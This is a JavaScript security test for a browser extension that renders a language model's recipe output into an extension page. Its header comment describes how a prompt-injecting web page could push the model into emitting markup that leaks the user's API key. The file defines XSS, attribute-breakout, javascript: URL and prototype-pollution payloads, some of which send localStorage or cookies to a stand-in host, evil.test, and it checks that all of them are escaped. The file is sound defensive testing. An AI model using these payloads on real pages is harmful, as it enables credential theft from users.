// Hostile input through the renderer.
//
// The threat model: a web page can say anything, its text is sent to a model, and
// the model's reply is rendered with innerHTML into an EXTENSION page — which has
// chrome.* access, so a single missed escape there could read chrome.storage.local
// and exfiltrate the user's API key. A prompt-injecting page therefore has a path
// to the key if any interpolation is unescaped. Every field the renderer touches
// is attacked here.
//
// Usage: node tests/security.mjs

import { renderArticle } from "../extension/shared/layout.js";
import { buildTree, salvage, validateRecipe } from "../extension/shared/schema.js";
import { diagnostics } from "../extension/shared/runlog.js";

let failures = 0;
const check = (name, condition, detail = "") => {
  if (condition) console.log(`ok   ${name}`);
  else {
    failures++;
    console.log(`FAIL ${name}${detail ? `\n     ${detail}` : ""}`);
  }
};

const XSS = `</td></table><script>fetch('https://evil.test?k='+localStorage.k)</script>`;
const ATTR = `x" onmouseover="fetch('https://evil.test')" data-x="`;
const IMG = `<img src=x onerror="chrome.storage.local.get(console.log)">`;

const hostile = {
  title: XSS,
  deck: IMG,
  tags: [XSS, ATTR],
  serves: 4,
  yield: IMG,
  vessel: ATTR,
  oven: XSS,
  active: IMG,
  time: ATTR,
  credit: XSS,
  source: "javascript:fetch('https://evil.test?k='+document.cookie)",
  notes: [{ title: XSS, body: IMG }],
  sections: [
    {
      name: XSS,
      prep: [IMG],
      finish: [ATTR],
      tree: {
        op: XSS,
        detail: IMG,
        children: [
          {
            op: ATTR,
            detail: XSS,
            children: [
              {
                item: IMG,
                note: XSS,
                name: ATTR,
                amount: 2,
                unit: ATTR,
                metric: 100,
                metric_unit: ATTR,
              },
            ],
          },
          { item: XSS, from: ATTR },
        ],
      },
    },
  ],
};

const html = renderArticle(structuredClone(hostile));

// The decisive checks: nothing executable may survive into the markup.
check("no <script> element survives", !/<script/i.test(html));

/**
 * Attribute names actually parsed out of real tags. A naive search for `on…=`
 * anywhere gives false positives: quotes inside TEXT content are inert (no tag can
 * be opened because `<` is escaped), and `&quot;` inside an attribute value cannot
 * close it. Only a name in a genuine attribute position can execute.
 */
const attributeNames = () => {
  const names = [];
  for (const [, inner] of html.matchAll(/<[a-z][a-z0-9]*((?:\s+[^\s=>]+(?:\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+))?)*)\s*\/?>/gi)) {
    // The value must be consumed along with the name, or a name-like string
    // inside a &quot;-escaped value reads as another attribute.
    for (const [, name] of inner.matchAll(/([^\s=/>]+)(?:\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+))?/g)) {
      if (name) names.push(name.toLowerCase());
    }
  }
  return names;
};

const handlers = attributeNames().filter((n) => n.startsWith("on"));
check("no element carries an event-handler attribute", handlers.length === 0, handlers.join(", "));
check(
  "every attribute emitted is one the renderer means to emit",
  attributeNames().every((n) =>
    ["class", "style", "rowspan", "colspan", "href", "data-row", "data-stage", "data-rows",
     "data-amount", "data-unit", "data-metric", "data-metric-unit", "data-name",
     "data-serves", "aria-hidden", "lang", "type"].includes(n),
  ),
  attributeNames().filter((n) =>
    !["class","style","rowspan","colspan","href","data-row","data-stage","data-rows","data-amount",
      "data-unit","data-metric","data-metric-unit","data-name","data-serves","aria-hidden","lang","type"].includes(n)).join(", "),
);
check("no <img> or other injected element survives", !/<img/i.test(html));
check("no </td> or </table> breaks out of a cell", !/<\/td>\s*<\/table>/i.test(html));
check(
  "a javascript: source is not turned into a link",
  !/href="javascript:/i.test(html),
  /href="[^"]*"/i.exec(html)?.[0],
);
check("only tags the renderer itself emits are present",
  [...html.matchAll(/<\/?([a-z0-9]+)/gi)].every(([, tag]) =>
    ["article", "header", "div", "p", "h1", "h2", "h3", "dl", "dd", "dt", "span", "a",
     "table", "colgroup", "col", "tr", "td", "ol", "footer", "pre", "button", "li"].includes(
      tag.toLowerCase(),
    ),
  ),
  [...html.matchAll(/<\/?([a-z0-9]+)/gi)].map(([, t]) => t).filter((t) =>
    !["article","header","div","p","h1","h2","h3","dl","dd","dt","span","a","table","colgroup","col","tr","td","ol","footer","pre","button","li"].includes(t.toLowerCase())).join(", "),
);

// The payloads must still be *present*, escaped — silently dropping them would
// mean the renderer was lying about the recipe.
check("the payload text is preserved, escaped", html.includes("&lt;script&gt;"));
check("attribute payloads are quote-escaped", html.includes("&quot;") || !html.includes(`"${ATTR}`));

// Attributes built from model data must not break out.
const attrs = [...html.matchAll(/<td ([^>]*)>/g)].map(([, a]) => a);
check(
  "no cell attribute list contains a raw double quote break-out",
  attrs.every((a) => !/data-[a-z-]+="[^"]*"[^ =/>]/.test(a)),
  attrs.find((a) => /data-[a-z-]+="[^"]*"[^ =/>]/.test(a)),
);

// A hostile recipe must still be rejected or rendered — never crash the page.
const salvaged = salvage(structuredClone(hostile));
check("salvage survives hostile input", Boolean(salvaged.recipe));
check("validation survives hostile input", typeof validateRecipe(salvaged.recipe).ok === "boolean");
check("buildTree survives hostile input", Boolean(buildTree(structuredClone(hostile))));

// Prototype pollution through model output.
const polluted = salvage(JSON.parse('{"sections":[{"__proto__":{"polluted":true},"tree":{"op":"x","children":[{"item":"y"}]}}]}'));
check("no prototype pollution from a crafted key", ({}).polluted === undefined, String(({}).polluted));

// Diagnostics go to the clipboard: they must never carry the key.
const KEY = "sk-or-v1-0123456789abcdef0123456789abcdef";
const report = diagnostics({
  provider: "openrouter",
  model: "m",
  url: "https://x",
  state: "error",
  // A provider that echoes the Authorization header into its error body.
  error: { message: `HTTP 401: invalid api key ${KEY}`, detail: `sent Bearer ${KEY}` },
  steps: [{ label: "l", detail: `key=${KEY}`, ms: 1, state: "error" }],
});
check("an API key echoed by a provider is scrubbed from diagnostics", !report.includes(KEY), report.slice(0, 400));

console.log(failures ? `\n${failures} check(s) failed` : "\nall checks passed");
process.exit(failures ? 1 : 0);
